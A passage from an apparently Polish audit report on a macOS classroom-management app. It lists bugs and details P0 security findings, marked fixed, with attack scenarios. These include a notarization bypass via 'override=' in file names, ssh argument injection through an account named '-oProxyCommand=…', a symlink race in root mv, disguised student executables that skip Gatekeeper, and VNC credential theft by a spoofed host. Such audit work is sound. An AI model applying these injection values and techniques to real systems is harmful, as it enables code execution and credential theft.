| [PRZ-05](#prz-05) | Przygotowanie iMaców, uaktualnienia | `README.md:34` | README podaje macOS 13, a aplikacja wymaga macOS 14 | otwarte |
| [PRZ-06](#prz-06) | Przygotowanie iMaców, uaktualnienia | `README.md:52` | Kod wyjścia 4 skryptu konfiguracyjnego nieopisany w README | otwarte |
| [PRZ-07](#prz-07) | Przygotowanie iMaców, uaktualnienia | `README.md:96` | README: „Skrypt sam wybiera zgodne SDK” – build-app.sh nie ma już tej logiki | otwarte |
| [PRZ-08](#prz-08) | Przygotowanie iMaców, uaktualnienia | `Sources/CMCRCore/Scripts+Setup.swift:425` | Gotowość: przy pierwszym sudo na koncie błędne hasło pokazuje się jako „błąd: WARNING: Improper use…” zamiast „złe hasło” | otwarte |
| [PRZ-09](#prz-09) | Przygotowanie iMaców, uaktualnienia | `Sources/CMCRCore/SelfUpdate.swift:764` | Instalator jako root dopisuje dziennik do ścieżki w katalogu użytkownika (podąża za dowiązaniem, TOCTOU) | otwarte |
| [PRZ-10](#prz-10) | Przygotowanie iMaców, uaktualnienia | `Sources/CMCRCore/SetupScript.swift:92` | cmcrctl: przy błędnych literach dni harmonogramu komunikat „wybierz co najmniej jeden dzień” | otwarte |
| [PRZ-11](#prz-11) | Przygotowanie iMaców, uaktualnienia | `Sources/CMCRCore/SetupScript.swift:384` | cmcrctl setup ignoruje zapisane opcje i po cichu cofa „Logowanie zdalne tylko kluczem” | otwarte |
| [PRZ-12](#prz-12) | Przygotowanie iMaców, uaktualnienia | `Sources/CMCRManager/ReadinessView.swift:23` | Ponowne sprawdzenie po naprawie jest pomijane, gdy dla iMaca trwa wcześniejsze sprawdzenie – tabela pokazuje stan sprzed naprawy | otwarte |
| [PRZ-13](#prz-13) | Przygotowanie iMaców, uaktualnienia | `Sources/CMCRManager/ReadinessView.swift:804` | Komórka gotowości proponuje naprawę, która nie może pomóc („brak konta” → Utwórz folder ucznia, „nie admin” → Hasło tego komputera…) | otwarte |
| [PRZ-14](#prz-14) | Przygotowanie iMaców, uaktualnienia | `Sources/CMCRManager/SetupOptionsSheet.swift:122` | Aplikacja pozwala uruchomić lub zapisać skrypt z niepoprawnym folderem ucznia (CLI to blokuje) | otwarte |
| [PRZ-15](#prz-15) | Przygotowanie iMaców, uaktualnienia | `setup/cmcr-imac-setup.sh:475` | „Tylko sprawdź”/--dry-run twierdzi „Usunięto prawo zapisu…” i nie liczy tej zmiany | otwarte |
| [PRZ-16](#prz-16) | Przygotowanie iMaców, uaktualnienia | `setup/cmcr-imac-setup.sh:717` | Nieudane pmset -a (WoL, uśpienie) i scutil --set są połykane – raport mówi „bez zmian”, kod 0 | otwarte |
| [PRZ-18](#prz-18) | Przygotowanie iMaców, uaktualnienia | `Sources/CMCRManager/UpdateViews.swift:357` | „Sprawdź teraz” w oknie Ustawień (i „Sprawdź uaktualnienia…” bez widocznego głównego okna) pokazuje wynik w niewidocznym arkuszu (zgłoszone przy weryfikacji) | otwarte |
| [TXT-01](#txt-01) | Teksty | `Sources/CMCRManager/MainToolbar.swift:59` | Podpowiedź „Ściana ekranów” obiecuje tylko zaznaczone komputery, a okno domyślnie pokazuje wszystkie | otwarte |
| [TXT-02](#txt-02) | Teksty | `README.md:106` | README: filtr i skrót opisane jako „online”, w UI to „Włączone” | otwarte |
| [TXT-03](#txt-03) | Teksty | `README.md:114` | README: „Pliki › Konwencja cmcr-helpers” – takiej pozycji nie ma | otwarte |
| [TXT-04](#txt-04) | Teksty | `README.md:177` | README: „Anuluj” zatrzymuje polecenie – przycisk to „Przerwij”; stan „Przerwano” vs wynik „Anulowano” | otwarte |
| [TXT-05](#txt-05) | Teksty | `Sources/CMCRCore/SSH.swift:689` | Komunikat SSH: zła nazwa „Logowanie zdalne” i dwuznaczne „na tym Macu” | otwarte |
| [TXT-06](#txt-06) | Teksty | `Sources/CMCRCore/ScreenCapture.swift:149` | Komunikaty o iMacu ucznia mówią „ten Mac”, czyli w aplikacji Mac nauczyciela | otwarte |
| [TXT-07](#txt-07) | Teksty | `Sources/CMCRCore/Scripts+Classroom.swift:257` | Wynik „wyłączenia za N min” odsyła do przycisku „Anuluj zaplanowane” | otwarte |
| [TXT-08](#txt-08) | Teksty | `Sources/CMCRCore/Scripts+Setup.swift:166` | Komunikaty gotowości odsyłają do przycisków, których nie ma | otwarte |
| [TXT-09](#txt-09) | Teksty | `Sources/CMCRCore/Scripts+Setup.swift:175` | „w Konfiguracja › …” – zły przypadek; dwuznaczne „w Ustawieniach” | otwarte |
| [TXT-10](#txt-10) | Teksty | `Sources/CMCRCore/Scripts.swift:369` | Komunikat odmowy instalacji odsyła do nieistniejącego przełącznika | otwarte |
| [TXT-12](#txt-12) | Teksty | `Sources/CMCRManager/App.swift:668` | Ta sama akcja „sesja SSH w Terminalu” ma cztery różne nazwy | otwarte |
| [TXT-13](#txt-13) | Teksty | `Sources/CMCRManager/HostInspector.swift:70` | Panel szczegółów: „120 GB wolne” i „Szyfrowanie dysku: włączony” | otwarte |
| [TXT-14](#txt-14) | Teksty | `Sources/CMCRManager/ReadinessView.swift:279` | Instrukcja „Nagrywanie ekranu” pomija /usr/libexec/sshd-session | otwarte |
| [TXT-15](#txt-15) | Teksty | `Sources/CMCRManager/RemoteBrowserComponents.swift:271` | W oknie pojawia się skrócona etykieta CLI stanu („offline”, „online”, „błąd”) | otwarte |
| [TXT-16](#txt-16) | Teksty | `Sources/CMCRManager/RemoteBrowserComponents.swift:400` | Trzy różne nazwy opcji macOS „pełny dostęp do dysku dla użytkowników zdalnych” | otwarte |
| [TXT-17](#txt-17) | Teksty | `Sources/CMCRManager/RemoteBrowserModel.swift:260` | Tytuły zadań przeglądarki: „Usuń/Pobierz/Wyślij 3 elementów” | naprawione (fe7f85a) |
| [TXT-19](#txt-19) | Teksty | `Sources/CMCRManager/Updater.swift:174` | Uaktualnienie aplikacji nazwane „aktualizacją” | otwarte |
| [TXT-20](#txt-20) | Teksty | `Sources/cmcrctl/CLI.swift:69` | Pomoc cmcrctl: ustawienie „Równoległe operacje” nie istnieje, formatowanie niespójne | otwarte |
| [TXT-22](#txt-22) | Teksty | `Sources/cmcrctl/ScreenWatch.swift:52` | cmcrctl: „Zakończono: 3 cykli, 1 nowych obrazów” i „1 błędów składni” | otwarte |
| [TXT-23](#txt-23) | Teksty | `setup/cmcr-imac-setup.sh:836` | Raport skryptu konfiguracyjnego: „Zainstalowano Rosetta 2”, „wpis(ów)”, „klucz menedżera” | otwarte |
| [TXT-24](#txt-24) | Teksty | `Sources/CMCRManager/SetupOptionsSheet.swift:421` | Folder /Applications nazywany raz „Programy”, raz „Aplikacje”; aktualny polski macOS pokazuje „Aplikacje” (zgłoszone przy weryfikacji) | otwarte |
| [UI-01](#ui-01) | Interfejs | `Sources/CMCRManager/App.swift:70` | ⌘, przypisany trzem pozycjom menu – skrót opisany przy „Ustawienia…” nie otwiera okna Ustawień | otwarte |
| [UI-05](#ui-05) | Interfejs | `Sources/CMCRManager/SetupView.swift:378` | „Wczytaj listę z pliku…” zastępuje całą listę komputerów bez potwierdzenia | otwarte |
| [UI-06](#ui-06) | Interfejs | `Sources/CMCRManager/App.swift:158` | Usunięty standardowy przycisk paska bocznego i wymuszany tryb paska narzędzi | otwarte |
| [UI-07](#ui-07) | Interfejs | `Sources/CMCRManager/AppsView.swift:40` | Lista uruchomionych aplikacji nie wczytuje się dla komputerów zaznaczonych po wejściu w dział | otwarte |
| [UI-08](#ui-08) | Interfejs | `Sources/CMCRManager/ClassroomView.swift:496` | Ta sama akcja lub ten sam stan oznaczane różnymi symbolami | otwarte |
| [UI-10](#ui-10) | Interfejs | `Sources/CMCRManager/ClassroomView.swift:859` | Niespójna terminologia: „sekcja” zamiast „dział”, „Zaktualizowano” dla uaktualnienia aplikacji, „Pobrane rzeczy” vs „Pobrane” | otwarte |
| [UI-12](#ui-12) | Interfejs | `Sources/CMCRManager/ConfigIssuesAlert.swift:48` | Przykładowy komunikat w zrzutach UI podaje nieistniejący plik „hosts.json.damaged” | otwarte |
| [UI-13](#ui-13) | Interfejs | `Sources/CMCRManager/DashboardView.swift:65` | Tabela działu Komputery z otwartym panelem szczegółów nie mieści się w oknie 1180 pt | otwarte |
| [UI-14](#ui-14) | Interfejs | `Sources/CMCRManager/JobsView.swift:666` | Błędy zapisu i otwierania sygnalizowane tylko dźwiękiem albo przemilczane | otwarte |
| [UI-15](#ui-15) | Interfejs | `Sources/CMCRCore/LessonRoutine.swift:169` | „najwyżej N komputerów naraz” – zła odmiana dla N = 1…4 (zgłoszone przy weryfikacji) | otwarte |
| [UI-16](#ui-16) | Interfejs | `Sources/CMCRManager/ScreenControls.swift:49` | „Zmień ograniczenia…” otwiera Konfigurację na zakładce Komputery zamiast ustawień podglądu | otwarte |
| [UI-17](#ui-17) | Interfejs | `Sources/CMCRManager/ScreenControls.swift:217` | „Szczegóły” w banerze podglądu i pasku Przeglądarki otwiera Zadania bez wskazania właściwego działania | otwarte |
| [UI-18](#ui-18) | Interfejs | `Sources/CMCRManager/ScreenControls.swift:238` | Animacje przesunięcia i skalowania ignorują ustawienie „Ogranicz ruch” | otwarte |
| [UI-19](#ui-19) | Interfejs | `Sources/CMCRManager/ScreenTiles.swift:268` | Świeżość obrazu i zaznaczenie kafelka w podglądzie rozróżniane tylko kolorem | otwarte |
| [UI-20](#ui-20) | Interfejs | `Sources/CMCRManager/ScreenWall.swift:230` | Ikona „Pełny ekran” w Ścianie ekranów wymaga macOS 15 – na macOS 14 przycisk jest bez ikony | otwarte |
| [UI-21](#ui-21) | Interfejs | `Sources/CMCRManager/ScreenWall.swift:414` | Menu i menu kontekstowe mieszają pozycje z ikonami i bez ikon | otwarte |
| [UI-22](#ui-22) | Interfejs | `Sources/CMCRManager/UpdatesView.swift:54` | Symbole SF z ograniczeniami Apple użyte niezgodnie z przeznaczeniem | otwarte |
| [UI-23](#ui-23) | Interfejs | `Sources/CMCRManager/App.swift:49` | Pomoc › „Pomoc aplikacji CMCR Manager” (⌘?) pokazuje tylko, że pomoc jest niedostępna (zgłoszone przy weryfikacji) | otwarte |
| [UI-24](#ui-24) | Interfejs | `Sources/CMCRManager/App.swift:437` | „Usuń grupę” bez potwierdzenia, niespójne role „Przerwij”, przyciski niszczące tuż obok zwykłych | otwarte |
| [UI-25](#ui-25) | Interfejs | `Sources/CMCRManager/SetupView.swift:1044` | Zrzut „settings” w ciemnym motywie pokazuje zakładkę Uaktualnienia zamiast Ogólne (zgłoszone przy weryfikacji) | otwarte |
| [WSP-03](#wsp-03) | Współbieżność | `Sources/CMCRManager/App.swift:134` | Odświeżanie co 2 min działa tylko przy otwartym oknie głównym – sama Ściana ekranów nie dostaje aktualnego stanu | otwarte |
| [WSP-04](#wsp-04) | Współbieżność | `Sources/CMCRManager/AppModel+Jobs.swift:322` | „Przerwij” nie działa w trakcie pakowania plików (tar) | otwarte |
| [WSP-05](#wsp-05) | Współbieżność | `Sources/CMCRManager/AppModel+Jobs.swift:400` | Kliknięcie powiadomienia „Zakończono…” bez okna głównego niczego nie pokazuje | otwarte |
| [WSP-06](#wsp-06) | Współbieżność | `Sources/CMCRManager/AppModel.swift:823` | Lista zainstalowanych aplikacji ignoruje błędy i nie pokazuje postępu | otwarte |
| [WSP-07](#wsp-07) | Współbieżność | `Sources/CMCRManager/RemoteBrowserComponents.swift:460` | Nowy folder / Zmień nazwę z „/” w nazwie – tylko dźwięk, nazwa przepada | otwarte |
| [WSP-08](#wsp-08) | Współbieżność | `Sources/cmcrctl/ConfigCommands.swift:54` | cmcrctl hosts add/set/remove/generate pisze „Dodano…” i kończy z kodem 0, choć hosts.json nie został zapisany (zgłoszone przy weryfikacji) | naprawione (b5d9416) |
| [WŁ-01](#wł-01) | Własne | `Sources/CMCRManager/App.swift:46` | Menu Pomoc › „Pomoc aplikacji CMCR Manager” (⌘?) nie prowadzi do żadnej pomocy | otwarte |
| [ZAD-03](#zad-03) | Zadania, polecenia | `Sources/CMCRManager/AppModel.swift:440` | Wynik zdalnego zatrzymania nie trafia do podsumowania ani historii – „Anulowano” nawet gdy polecenie nadal działa | otwarte |
| [ZAD-04](#zad-04) | Zadania, polecenia | `Sources/CMCRCore/JobHistory.swift:183` | Zapis historii może nadpisać cały plik miesiąca jednym wpisem | otwarte |
| [ZAD-05](#zad-05) | Zadania, polecenia | `Sources/CMCRCore/JobHistory.swift:246` | Historia: wpisy starsze niż 90 dni widoczne z usuniętym wyjściem, limit 3000 tnie partie | otwarte |
| [ZAD-06](#zad-06) | Zadania, polecenia | `Sources/CMCRCore/SSH.swift:424` | Przerwanie tuż po starcie pomija zatrzymanie na iMacu, choć polecenie już ruszyło | otwarte |
| [ZAD-07](#zad-07) | Zadania, polecenia | `Sources/CMCRCore/SSH.swift:681` | Kod 255 lub „ssh:” w stderr działającego polecenia oznacza iMaca jako niedostępny/błąd | otwarte |
| [ZAD-08](#zad-08) | Zadania, polecenia | `Sources/CMCRManager/AppModel+Jobs.swift:416` | Powiadomienie „Gotowe na 0 komputerach” gdy wszystko się nie udało | otwarte |
| [ZAD-09](#zad-09) | Zadania, polecenia | `Sources/CMCRManager/AppModel.swift:442` | Niespójna terminologia anulowania i nagłówków wyników | otwarte |
| [ZAD-10](#zad-10) | Zadania, polecenia | `Sources/CMCRManager/AppModel.swift:450` | Przy błędzie cały stderr jest dopisywany drugi raz do wyniku i historii | otwarte |
| [ZAD-11](#zad-11) | Zadania, polecenia | `Sources/CMCRManager/AppModel.swift:491` | „Wyczyść zakończone” gubi oglądaną partię z historii | otwarte |
| [ZAD-13](#zad-13) | Zadania, polecenia | `Sources/cmcrctl/CLI.swift:240` | cmcrctl uruchamia skrypty bez rejestracji zadania: Ctrl-C nie zatrzymuje polecenia na iMacu | otwarte |
| [ZAD-14](#zad-14) | Zadania, polecenia | `Sources/cmcrctl/CLI.swift:354` | cmcrctl nie zapisuje działań w dzienniku actions.log | otwarte |
| [ZAD-15](#zad-15) | Zadania, polecenia | `Sources/cmcrctl/CLI.swift:359` | cmcrctl exec --root nie pyta o ryzykowne polecenia, aplikacja pyta | otwarte |
| [ZAD-16](#zad-16) | Zadania, polecenia | `Sources/CMCRManager/AppModel.swift:439` | Przerwane zadania i zadania po limicie czasu mają w historii i eksporcie „kod” lokalnego ssh lub -1 (zgłoszone przy weryfikacji) | otwarte |
| [ZAJ-02](#zaj-02) | Zajęcia, podgląd | `Sources/CMCRCore/Classroom.swift:563` | Eksport odpowiedzi uczniów do CSV bez ochrony przed formułami | otwarte |
| [ZAJ-06](#zaj-06) | Zajęcia, podgląd | `Sources/CMCRCore/LessonRoutine.swift:91` | Puste ostrzeżenie końca zajęć pokazuje uczniom pusty komunikat | otwarte |
| [ZAJ-07](#zaj-07) | Zajęcia, podgląd | `Sources/CMCRCore/LessonRoutine.swift:169` | Ręcznie sklejane liczebniki: „najwyżej 2 komputerów”, „3 cykli, 3 nowych obrazów” | otwarte |
| [ZAJ-08](#zaj-08) | Zajęcia, podgląd | `Sources/CMCRCore/ScreenCapture.swift:436` | Jakość JPEG z ustawień stosowana tylko przy zmniejszaniu obrazu | otwarte |
| [ZAJ-09](#zaj-09) | Zajęcia, podgląd | `Sources/CMCRCore/Scripts+Classroom.swift:386` | „Zamknij aplikacje › Wszystkie” zabija aplikacje SIGTERM bez szansy zapisu | otwarte |
| [ZAJ-10](#zaj-10) | Zajęcia, podgląd | `Sources/CMCRManager/ClassroomModel.swift:395` | Nieudane ponowne zablokowanie odblokowuje ekran, a aplikacja pokazuje go jako zablokowany | otwarte |
| [ZAJ-11](#zaj-11) | Zajęcia, podgląd | `Sources/CMCRManager/ClassroomModel.swift:427` | Pytanie: pominięte komputery wiszą jako „czeka na odpowiedź” na zawsze | otwarte |
| [ZAJ-12](#zaj-12) | Zajęcia, podgląd | `Sources/CMCRManager/ClassroomModel.swift:428` | Nowe pytanie nie zamyka poprzedniego – stare okna zostają u uczniów, a odpowiedzi znikają z tabeli | otwarte |
| [ZAJ-13](#zaj-13) | Zajęcia, podgląd | `Sources/CMCRManager/ClassroomView.swift:466` | „Gotowe na wszystkich komputerach.” po przerwaniu lub pominięciu komputerów | otwarte |
| [ZAJ-14](#zaj-14) | Zajęcia, podgląd | `Sources/cmcrctl/ClassroomCommands.swift:357` | cmcrctl lesson start budzi i obsługuje komputery po kolei | otwarte |
| [ZAJ-15](#zaj-15) | Zajęcia, podgląd | `Sources/cmcrctl/ScreenWatch.swift:99` | screen-watch wypisuje ścieżkę klatki, nawet gdy zapis się nie udał | otwarte |
| [ZAJ-17](#zaj-17) | Zajęcia, podgląd | `Sources/CMCRManager/ScreenCenter.swift:510` | Wybór konkretnego monitora ukrywa przełącznik monitorów (zgłoszone przy weryfikacji) | otwarte |
| [ZAJ-18](#zaj-18) | Zajęcia, podgląd | `Sources/cmcrctl/ScreenWatch.swift:34` | cmcrctl screen-watch i screenshot nie zapisują sesji podglądu w dzienniku działań (zgłoszone przy weryfikacji) | otwarte |

## Szczegóły

### APL-01

**„override=” w nazwie pliku wyłącza sprawdzanie notaryzacji instalatora** – P0, Aplikacje, instalacja, aktualizacje, `Sources/CMCRCore/Scripts.swift:336`

cmcr_verify_signature uznaje, że Gatekeeper jest wyłączony, gdy w CAŁYM wyjściu `spctl -vv` występuje „override=”. Pierwszy wiersz tego wyjścia to ścieżka sprawdzanego elementu, więc wystarczy odpowiednia nazwa pliku lub folderu w archiwum .zip/.dmg (np. folder „override=/X.app” albo „Setup override=1.pkg”) lub ostatni człon adresu w install-url, by przy WŁĄCZONYM Gatekeeperze przejść na słabszą ścieżkę: `pkgutil --check-signature` / `codesign -R` (sam Developer ID, bez notaryzacji i bez jej cofnięcia przez Apple). Pakiet lub aplikacja podpisane Developer ID, ale nienotaryzowane (albo z unieważnioną notaryzacją), instalują się jako root bez „Zezwalaj na instalatory bez podpisu Apple”.

**Status:** naprawione (2f96309)

### CLI-01

**lesson start wysyła uczniom zawartość bieżącego katalogu, gdy folder materiałów jest pusty** – P0, cmcrctl, `Sources/cmcrctl/ClassroomCommands.swift:332`

Gdy w classroom.json jest sendMaterials=true i materialsFolder="" (GUI pozwala włączyć krok bez wyboru folderu i tylko go pomija), cmcrctl buduje URL(fileURLWithPath: ""), czyli bieżący katalog roboczy, pakuje całą jego zawartość i jako root wysyła do folderu ucznia (tryb 666/777) na wszystkie wskazane iMaki. Gdy cmcrctl uruchomiono np. w ~/Public/cmcr (zebrane prace innych klas) albo ~/.ssh (klucz administratora), te pliki trafiają do uczniów. Do tego błąd Payload.make jest połykany (krok „brak materiałów”, kod 0).

**Status:** naprawione (88772b3)

### DOD-01

**Pliki od ucznia rozpakowywane na Macu nauczyciela bez kwarantanny, więc Gatekeeper ich nie sprawdza** – P0, Dodatkowe przeszukanie, `Sources/CMCRCore/Operations+Browse.swift:79`

Zdalny tar działa z COPYFILE_DISABLE=1 (Scripts+Browse.swift:319, Scripts.swift:861), więc nie przenosi xattr. Lokalne /usr/bin/tar -xf uruchamiane z aplikacji bez sandboksa i bez LSFileQuarantineEnabled też nie nadaje com.apple.quarantine. Dotyczy to wszystkich trzech miejsc rozpakowania: Operations+Browse.swift:79 (Zbierz prace, cmcrctl collect), :176 (Operations.extract: Pobierz w Przeglądarce, cmcrctl get) i Operations.swift:51 (Zakończ zajęcia › zbieranie, cmcr-pull, cmcrctl pull). Bity +x są zachowane. Scenariusz: uczeń zostawia w folderze cmcr „Praca.pdf.app” (Finder ukrywa .app, ikona PDF) albo „projekt.command”. Nauczyciel klika „Otwórz zebrane prace” (ClassroomView.swift:486) lub „Pokaż zebrane prace” i otwiera plik dwuklikiem. Kod ucznia uruchamia się wtedy na koncie nauczyciela bez ostrzeżenia Gatekeepera. Na tym koncie są klucz SSH do wszystkich iMaców i hasła administratora w Pęku kluczy. To samo dotyczy programów, które uczeń pobrał z internetu: na iMacu miały kwarantannę, ale transport ją usuwa (np. nauczyciel pobiera w Przeglądarce podejrzany plik z Pobranych ucznia, żeby go sprawdzić). grep 'quarantine' w Sources znajduje wyłącznie jej usuwanie (Scripts.swift:390, 812; SelfUpdate.swift:869).

**Status:** naprawione (eb069f7)

### DOD-02

**„Steruj ekranem”/VNC łączy się z nazwą .local bez sprawdzenia stanu i zaufania klucza (HostTrust)** – P0, Dodatkowe przeszukanie, `Sources/CMCRManager/AppModel.swift:703`

openScreenSharing otwiera wprost vnc://<konto administratora>@<adres>.local, nie sprawdzając ani stanu komputera (offline/błąd), ani zaufania klucza SSH (nieznany lub ZMIENIONY). Wszystkie wejścia (DashboardView.swift:102, App.swift:660, HostInspector.swift:125, ScreenTiles.swift:304/368/498, ScreenWall.swift:356) są aktywne niezależnie od stanu. Udostępnianie ekranu nie wiąże tożsamości serwera z kluczem zaufanym w aplikacji, a nazwy Bonjour .local nie są uwierzytelniane (README l.174). Scenariusz: imac05 jest wyłączony (albo aplikacja właśnie oznaczyła go „Klucz SSH komputera się zmienił – połączenie przerwano przed logowaniem”), inne urządzenie w sieci odpowiada na imac05.local i wystawia serwer VNC z uwierzytelnianiem ARD (DH bez uwierzytelnienia serwera). Nauczyciel klika „Steruj ekranem” → Udostępnianie ekranu wysyła nazwę konta administratora z URL i hasło (wpisane ręcznie lub automatycznie z Pęku kluczy, jeśli zapamiętane) do podstawionego urządzenia. To dokładnie przypadek, przed którym README obiecuje ochronę („hasło administratora … nie są wysyłane” do niepotwierdzonego urządzenia). Dodatkowo stan .changed nie trafia do untrustedHosts (AppModel.swift:579 – usuwany), więc aplikacja nie ma nawet flagi, którą mogłaby zablokować VNC.

**Status:** naprawione (0d14b5c)

### KON-01

**Konto zaczynające się od „-” (np. z importowanej listy) wykonuje polecenie na Macu nauczyciela przy sprawdzaniu klucza** – P0, Konfiguracja, `Sources/CMCRCore/HostTrust.swift:169`

HostTrust.scan przekazuje host.destination (konto@adres) do /usr/bin/ssh bez walidacji i bez „--”, a po nim stały argument „true”. Konto „-oProxyCommand=…” ssh czyta więc jako opcję, „true” staje się nazwą hosta, a ProxyCommand uruchamia się lokalnie jeszcze przed sprawdzeniem klucza. HostValidation tylko rysuje trójkąt w tabeli (komunikat twierdzi, że „połączenie nie zadziała”); import (SetupView.importHosts), hosts.json ani SSH.* nie blokują takich wpisów. Wyzwalacze: Przygotowanie iMaców › Szybkie naprawy › Sprawdź klucz komputera… (AppModel.reviewHostKeys → HostTrust.scan) oraz `cmcrctl trust all` z README (krok 2). Zwykłe SSH.run jest przypadkiem chronione, bo po celu idzie polecenie ze spacjami („hostname contains invalid characters”).

**Status:** naprawione (26edf17)

### KON-02

**Powtórzone „id” w importowanej liście lub hosts.json powoduje awarię aplikacji przy „Rozpocznij zajęcia”** – P0, Konfiguracja, `Sources/CMCRCore/Store.swift:182`; także: `Sources/CMCRManager/ClassroomModel.swift:26`, `Sources/CMCRManager/ClassroomModel.swift:537`

ConfigStore.importHosts (i loadHosts) dekodują listę bez sprawdzenia unikalności Machine.id z pliku. Naturalny sposób dopisania komputera w edytorze – skopiowanie wpisu z wyeksportowanego cmcr-komputery.json i zmiana nazwy/adresu – daje dwa wpisy o tym samym id. Po wczytaniu (SetupView.swift:378) i zaznaczeniu obu LessonRun.init (ClassroomModel.swift:26) oraz zmiana nazw komputerów (ClassroomModel.swift:537) budują Dictionary(uniqueKeysWithValues:) po id → pułapka i zamknięcie aplikacji. Wcześniej: edycja drugiego wiersza w tabeli zmienia pierwszy (field() szuka firstIndex po id), oba mają wspólny status i własne hasło.

**Status:** naprawione (332b819)

### PLI-01

**Zmiana nazwy jako root: mv bez -h podąża za dowiązaniem podstawionym po sprawdzeniu** – P0, Pliki, przeglądarka, `Sources/CMCRCore/Scripts+Browse.swift:279`

renameItem sprawdza `[ -e "$DST" ] || [ -L "$DST" ]`, a dopiero potem wykonuje `mv -n "$SRC" "$DST"` (w gałęzi zmiany wielkości liter `mv "$SRC" "$DST"`, l. 274). Gdy uczeń w tym oknie utworzy w swoim folderze DST jako dowiązanie do katalogu (innego konta albo systemowego, np. /private/etc), BSD mv bez -h traktuje cel jako katalog i root przenosi plik ucznia DO celu dowiązania, a skrypt wypisuje „✔ Zmieniono nazwę”. Nowa nazwa jest widoczna dla ucznia w `ps` (tekst skryptu jest w argumentach powłoki administratora). To łamie zapewnienie README, że zmiana nazw w Przeglądarce nie przechodzi przez dowiązania użytkowników (push używa właśnie `mv -h` z tego powodu). Ten sam wzorzec: przywracanie w pushFinalize `/bin/mv "$STAGE/old/$n" "$t"` (Scripts.swift:827) bez -h.

**Status:** naprawione (8c5e60c)

### PRZ-01

**Szybka naprawa „Włącz Udostępnianie ekranu” włącza VNC bez listy dostępu (dla wszystkich kont, także ucznia)** – P0, Przygotowanie iMaców, uaktualnienia, `Sources/CMCRCore/Scripts.swift:1109`

Przycisk naprawy w komórce „Udostępnianie ekranu” (ReadinessView.swift:808), pozycja menu Szybkie naprawy (l. 439) i applyReadinessFix(.vnc) (l. 133) uruchamiają Scripts.enableScreenSharing(), które wykonuje tylko launchctl enable/bootstrap. Grupy com.apple.access_screensharing z zagnieżdżoną grupą admin nie tworzy ani nie przywraca. Robi to wyłącznie skrypt konfiguracyjny (ensure_access_group screensharing, setup/cmcr-imac-setup.sh:679), który też traktuje brak grupy jako „Wszyscy użytkownicy”. Scenariusz: na iMacu, na którym VNC nigdy nie było konfigurowane, nauczyciel klika naprawę. Do Udostępniania ekranu może się wtedy zalogować każde konto lokalne, w tym wspólne konto „student”, którego hasło uczniowie znają. Uczeń przy innym iMacu podgląda ekran kolegi (lub nim steruje). Późniejsze „Skonfiguruj zaznaczone” bez --enable-vnc tego nie poprawia, bo step_vnc zgłasza tylko „bez zmian”. README opisuje tę funkcję jako „Udostępnianie ekranu dla administratorów (--enable-vnc)”. Ten sam skrypt wywołuje ukryte polecenie cmcrctl „screen-sharing”.

**Status:** naprawione (592ad27)

### WSP-01

**Dziennik działań zapisywany API rzucającym wyjątek – crash przy pełnym dysku** – P0, Współbieżność, `Sources/CMCRCore/Store.swift:225`

ConfigStore.log dopisuje do actions.log przez stare seekToEndOfFile()/write(_:) NSFileHandle, które przy błędzie zapisu (ENOSPC, EFBIG, I/O) rzucają NSFileHandleOperationException – Swift jej nie łapie, aplikacja i cmcrctl kończą się awarią. log() jest wołany przy każdym runBatch, w HostTrust.trust, przy podglądzie ekranu i w JobHistory.record po nieudanym zapisie historii, więc np. gdy „Zbierz prace” (duże projekty uczniów) zapełni dysk, pierwsze zakończone zadanie zamyka aplikację (tracąc stan pozostałych). Zweryfikowane skryptem w scratchpadzie: przy RLIMIT_FSIZE writeData: kończy proces („File too large”), a try write(contentsOf:) zwraca błąd.

**Status:** naprawione (a085a2a)

### ZAJ-01

**Koniec zajęć: „Wyczyść folder cmcr” kasuje też pliki zapisane po migawce zbierania prac** – P0, Zajęcia, podgląd, `Sources/CMCRCore/LessonRoutine.swift:287`

Krok „Wyczyść folder cmcr ucznia” wywołuje Scripts.cleanFolder, które usuwa CAŁĄ zawartość folderu (find . -mindepth 1 -maxdepth 1 -exec rm -rf), a nie tylko pliki zebrane chwilę wcześniej. Między migawką tar w kroku „Zbierz prace” a czyszczeniem mija czas transferu, rozpakowania i nowej sesji SSH z sudo (sekundy–minuty), a uczeń jest wciąż zalogowany (wylogowanie jest później, zamykanie aplikacji domyślnie wyłączone; ostrzeżenie każe właśnie „zapisać pracę w folderze cmcr”). Plik zapisany/zmieniony w tym oknie nie trafia do kopii, a potem zostaje skasowany – nieodwracalna utrata pracy ucznia. Dział Pliki ma do tego bezpieczną ścieżkę (Operations.collect + Scripts.removeCollected: usuwa tylko zebrane i niezmienione pliki), której scenariusz nie używa. Dodatkowo krok collect rozpakowuje tar wprost do <folder>/<m.name> bez uniqueURL, więc dwa komputery o tej samej nazwie albo „Powtórz na nieudanych” nadpisują wcześniej zebrane pliki (przy włączonym czyszczeniu – ich jedyną kopię).

**Status:** naprawione (65d8483)

### ZAJ-16

**Awaria po upływie odliczania końca zajęć: zakres Date()...end z odwróconymi granicami** – P0, Zajęcia, podgląd, `Sources/CMCRManager/ClassroomView.swift:470`

Podczas odliczania przed końcem zajęć sekcja postępu buduje `Text(timerInterval: Date()...end, countsDown: true)`, dopóki `run.countdownEnd` nie jest nil. Pętla w ClassroomModel.endLesson sprawdza czas co 0,5 s i dopiero potem zeruje countdownEnd (ClassroomModel.swift:337-340), więc przez ułamek sekundy po `end` wartość nadal istnieje. Każde przeliczenie body w tym oknie tworzy zakres z lowerBound > upperBound, a Swift przerywa program („Range requires lowerBound <= upperBound”, sprawdzane także w buildzie -O). LessonProgressSection ma @EnvironmentObject AppModel, więc przeliczenie wywoła np. wynik okresowego odświeżania stanu co 2 min, zmiana zaznaczenia, start zadania w innym dziale albo przełączenie zakładki. Sekcja jest widoczna domyślnie, bo po starcie zakończenia zajęć widok przełącza się na „Koniec lekcji” i przewija do postępu. Aplikacja pada tuż przed zbieraniem prac i kolejne kroki zakończenia zajęć się nie wykonują. Okno czasowe jest krótkie, ale powtarza się przy każdym zakończeniu zajęć.

*Zgłoszone przez recenzenta przy weryfikacji innej pozycji; sprawdzane przy naprawie.*

**Status:** naprawione (01a7a70)

### APL-02

**Safari i programy spoza folderów Programy ukryte jako „działające w tle”** – P1, Aplikacje, instalacja, aktualizacje, `Sources/CMCRCore/Models.swift:292`

